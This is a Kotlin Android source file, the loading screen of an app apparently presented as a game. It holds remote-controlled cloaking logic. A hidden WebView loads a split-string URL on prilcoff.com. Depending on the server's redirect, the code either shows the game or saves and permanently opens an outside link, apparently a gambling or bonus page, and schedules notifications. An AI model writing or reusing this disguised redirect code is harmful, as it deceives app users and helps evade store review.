package kristi.heroofmythhaven

import android.content.Intent
import android.graphics.Color
import android.net.Uri
import android.support.v7.app.AppCompatActivity
import android.os.Bundle
import android.support.customtabs.CustomTabsIntent
import android.support.v4.content.ContextCompat
import android.util.Log
import android.view.View
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import kotlinx.android.synthetic.main.activity_loading.*

class LoadingActivity : AppCompatActivity() {
    private var preferences : HeroSharedPreferences? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_loading)
        window.statusBarColor = Color.BLACK
        actionBar?.hide()
        preferences = HeroSharedPreferences(this).apply { getSharedPreference("heroweb") }
        val apiLink = preferences!!.getString("heroweb")
        if(apiLink != null && apiLink != "") open(apiLink)
        else inet()
    }

    private fun open(url: String) {
        val builder = CustomTabsIntent.Builder()
        builder.setToolbarColor(ContextCompat.getColor(this, R.color.black))
        val customTabsIntent = builder.build()
        //job.cancel()
        customTabsIntent.launchUrl(this, Uri.parse(url))
        finish()
    }

    private fun inet(){
        hero.settings.javaScriptEnabled = true
        Log.e("OPen", "wivew")
        hero.webViewClient = object : WebViewClient(){
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?
            ): Boolean {
                if(request == null) Log.e("kek", "sooqa req null")
                Log.e("Url", request?.url.toString())
                var req = request?.url.toString()
                if(req.contains("p.php")){
                    Log.e("Web", "p")
                    main()
                }
                else{
                    if(req.contains("google.com")){
                        Log.e("WEb", "google")
                        main()
                    }
                    else if(!req.contains("bonusik")){
                        Msg().scheduleNotification(this@LoadingActivity)
                        preferences?.putString("heroweb", "http://prilcoff.com/88bJGM")
                        open("http://prilcoff.com/88bJGM")
                    }

                }
                return super.shouldOverrideUrlLoading(view, request)
            }
        }
        //Notification().scheduleMsg(this@MainActivity)
        val protocol = "http://"
        val site = "prilcoff.com/"
        val php = "ThBYyN"
        Log.e("Testing", "$protocol$site$php")
        hero.loadUrl("$protocol$site$php")
    }

    private fun main(){
        progress_bar.visibility = View.GONE
        startActivity(Intent(this, LoginActivity::class.java))
        hero.destroy()
    }
}